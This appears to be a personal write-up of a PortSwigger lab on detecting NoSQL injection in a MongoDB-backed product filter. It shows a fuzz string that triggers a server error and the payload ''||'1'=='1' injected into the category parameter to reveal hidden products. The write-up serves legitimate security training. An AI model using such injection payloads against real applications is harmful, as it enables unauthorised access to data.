---
title: Detecting NoSQL injection
description: PortSwigger NoSQli Lab
---
https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection

The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.

## Discovery

Product category request
```http
GET /filter?category=Corporate+gifts HTTP/2
Host: 0a40001604766a14811e762e003d00ca.web-security-academy.net
Cookie: session=YHafF9Gt36VFuHgvai9iJYl9QnSYyGjo
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a40001604766a14811e762e003d00ca.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

This returns 3 items:
![](../../../../public/images/PS_NoSQL_Lab_20250607%20_173803.png)
Testing for NoSQL injection
```http
GET /filter?category=%27%22%60%7b%20%3b%24%46%6f%6f%7d%20%24%46%6f%6f%20%5c%78%59%5a HTTP/2
```

Server responds with an "Internal Server Error" showing that MongoDB is being used.
![](../../../../public/images/PS_NoSQL_lab_20250607%20_171300.png)

## Exploit
Payload
```
'||'1'=='1
```

Request
```http
GET /filter?category=Pets%27||%271%27==%271 HTTP/2
```

The `category=gifts` filter now returns all items after a NoSQL injection bypasses the query restriction.
![](../../../../public/images/PS_NoSQL_Lab_20250607%20_174006.png)